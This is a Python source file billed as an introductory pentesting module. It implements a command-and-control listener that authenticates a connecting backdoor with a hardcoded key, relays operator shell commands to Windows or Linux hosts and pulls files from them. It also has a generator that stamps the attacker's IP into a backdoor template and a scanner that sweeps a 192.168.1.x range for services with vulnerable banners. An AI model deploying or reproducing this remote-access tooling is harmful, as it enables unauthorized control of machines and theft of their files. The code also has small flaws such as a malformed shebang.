#!usr/bind/python
#-*- coding: utf-8 -*-

"""Introductory module of pentesting with python"""

__autor__ = "Jhonatan Leonardo Zuluaga Torres "
__copyright__ = "Copyright 2018, Jhonatan Zu"
__credits__ = "Jhonatan Zu"
__license__ = "GPL"
__version__ = "1.0.1"
__maintainer__ = "Jhonatan Zu"
__email__ = "jhonatan.zero@gmail.com"
__status__ = "Developer"


import socket, sys, os, re

class Control:
	"""set host"""
	def __init__(self,local_host):
		self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.key = 'key'
		self.host = local_host
		self.port = 7555
		self.error_count=0
		self.error_test = '' # Only for test 
		print('\n<°>Connected from: '+local_host+'.. >\n')

	def connection(self):
		while 1:
			try:
				self.conn.bind((self.host, self.port))
				print('waiting for connection...')
				self.conn.listen(1)
				conex,adrr = self.conn.accept()
				print('[o]Establishing Connection...')
				recept = conex.recv(4096) 
				print(recept.decode('utf-8')+"with {0}".format(adrr)) 
				self.authenticate(conex) 
			except:
				self.error_count+=1 
				if self.error_count == 1: 
					print("\nTrying, Please wait...") 
				if self.error_count == 91:  
					print("\nError in connection method ")
					break
				pass


	def authenticate(self, conex): 
		local_key = self.key
		key_recv = conex.recv(8)
		if local_key == key_recv.decode('utf-8'):
			print("<+>Ready..")
			while 1:
				sistema_o = input("\n[Menu] Connection with: 1)Windows - 2)Linux : ")
				if sistema_o == "1":
					self.console1(conex) 
				elif sistema_o == "2": 
					self.console2(conex) 
				else:
					print("Choose only the menu options please.")


	def console1(self, conex): 
		"""Connection with windows"""
		while 1: 
			try:
				while 1: 
					terminal = input('---°')
					if terminal != "" and not terminal.startswith(" "):	
						conex.send(terminal.encode()) 
						break

				if terminal.startswith('download '): 
						directory_file = input ('Write directory and name of file: ')
						with open(directory_file, 'wb') as create_file:
							conex.send('ok'.encode()) 
							size_bytes= conex.recv(1024).decode() 
							print('Size of the file you expect to receive:', size_bytes)
							count_bytes=0 
							while 1:	
								if count_bytes == int(size_bytes): 
									print('\n[o]Download succesfull')
									conex.send(b'end') 
									break
								recept_bytes = conex.recv(4096) 
								create_file.write(recept_bytes)
								count_bytes= count_bytes+len(recept_bytes) 
								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) 
				while True:
					back_output = conex.recv(4096).decode('cp850') 
					if not back_output == '*|*': 
						print(back_output) 
					else:
						break 
			except KeyboardInterrupt:
				sys.exit(1)
				self.server.close()


	def console2(self, conex): 
		"""Connection with Linux"""
		while 1: 
			try:
				while 1: 
					terminal = input('---°')
					if terminal != "" and not terminal.startswith(" "):	
						conex.send(terminal.encode()) 
						break
				if terminal.startswith('download '): 
						directory_file = input ('Write directory and name of file: ')
						with open(directory_file, 'wb') as create_file:
							conex.send('ok'.encode()) 
							size_bytes= conex.recv(1024).decode() 
							print('Size of the file you expect to receive:', size_bytes)
							count_bytes=0 
							while 1:	
								if count_bytes == int(size_bytes): 
									print('\n[o]Download succesfull')
									conex.send(b'end') 
									break
								recept_bytes = conex.recv(4096) 
								create_file.write(recept_bytes)
								count_bytes= count_bytes+len(recept_bytes) 
								sys.stdout.write('\rDownloaded bytes '+str(count_bytes)) 
				while True:
					back_output = conex.recv(4096).decode('utf-8', 'surrogateescape') 
					if not back_output == '*|*': 
						print(back_output) 
					else:
						break 
			except KeyboardInterrupt:
				sys.exit(1)
				self.server.close()


class Door():

	"""Generate back door"""
	def g_door(self, set_host, set_dir):
		Local_host = set_host
		with open('backx.py', 'rb') as f: 
			read_f = f.read()   
			print(re.search(r'###localhost###', read_f.decode('utf-8'))) 
			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8')) 
			print(substitution) 
			w_dir = set_dir 
			dir_f = w_dir +'.py' 
			create_f = open(dir_f, 'wb') 
			create_f.write(substitution.encode())
			create_f.close() 

  
class BannerScann():

	"""Set target port\s and vuln banner\s, set ports and set vulns"""
	def __init__(self, set_ports, set_vul): 
		self.ports = set_ports 
		self.vulnbann= set_vul 
	
	def convert(self): 
		"""Convert Ports"""
		list_ports = []
		list_vul = []
		if type(self.ports) is list: 
			list_ports = self.ports
		elif type(self.ports) is int: 			
			list_ports.append(self.ports) 	
		else: 
			for i in self.ports: 
				list_ports.append(i.strip())
		"""Convert vulnbanners"""
		if type(self.vulnbann) is list: 
				list_vul = self.vulnbann
		else: 
			for j in self.vulnbann: 
				list_vul.append(j.strip()) 
		return list_ports,list_vul
	
	def traking(self, rang1, rang2):
		"""Set initial and final host range"""
		use_ports, use_vul = self.convert()
		print('Retorno use_ports:', use_ports)
		print ('Retorno use_ports:', use_vul)
		#range1 = rang1 
		#range2 = rang2 
		for private_host in range(int(rang1), int(rang2)):
			print(private_host)
			for target_port in use_ports:
				print('puesrto iterado:',target_port)
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				try:
					sock.connect(('192.168.1.'+str(private_host), int(target_port) )) 
					sock.settimeout(1)
					get_banner = sock.recv(512).decode('utf-8') 
					for b_vulnn in use_vul:
						if get_banner.strip() == b_vulnn.strip(): 
							 print('\nA vulnerability was found in:\n\n', 
							 	   'HOST ->', private_host,
							 	   '\n PORT ->',target_port,
							       '\n Vulnerable service ->',get_banner)
					sock.close() 
				except Exception as e:
					print('STDERR=>', e)
				


if __name__ == "__main__":
	#play = Control('192.168.1.4')
	#play.connection()
	
	x = open('ports.txt', 'r')
	y = open('vulbanners.txt', 'r')
	play_bann = BannerScann(x,y)
	play_bann.traking('9','11')

	#play = Door()    
	#play.g_door('192.168.1.4', r'C:\Users\Public\Desktop\mumu')




	



















# inicio
"""
	os.system('color e')
	print('\n\n')
	print('  _________________________________________________________________')
	print(' | °°°°°°°°<+>>>>>>>>>>>  AGUIJON X - v 1.0  <<<<<<<<<<<+>°°°°°°°° |')
	print(' |______________________|-------------------|______________________|')

	print('\n\n <<<<<<> MENU <>>>>>>\n',
		       ' <1> Continue\n',
		       ' <2> Generate Door\n')
	menu=input('<choose>> ')
	print('\n')


	if menu == '1':
		pass
	elif menu == '2':
		Local_host = input('<Select Local IP>> ')
		with open('backx.py', 'rb') as f: # Abrir archivo en formato lectura bytes
			read_f = f.read()
			print(re.search(r'###localhost###', read_f.decode('utf-8')))
			substitution = re.sub(r'###localhost###', Local_host, read_f.decode('utf-8'))
			print(substitution)
			w_dir = input('Write the directory and the name of the door to create:\n<write>> ')
			dir_f = w_dir +'.py' #concatenar la ruta y el nombre con la extencion '.py'
			create_f = open(dir_f, 'wb')
			create_f.write(substitution.encode())
			create_f.close()
			
"""			

	